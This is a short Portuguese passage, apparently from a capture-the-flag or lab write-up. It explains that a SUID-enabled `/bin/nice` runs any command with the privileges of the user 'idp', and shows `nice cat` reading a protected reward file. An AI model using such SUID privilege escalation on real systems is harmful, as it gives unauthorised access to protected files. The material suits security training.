...
Neste exercício, o binário modificado é: `/bin/nice`
...
O `nice` executa um comando com prioridade de escalonamento modificada. Com SUID, o comando passado herda os privilégios do `idp`.

```bash
nice cat /desafio/recompensa.txt
```
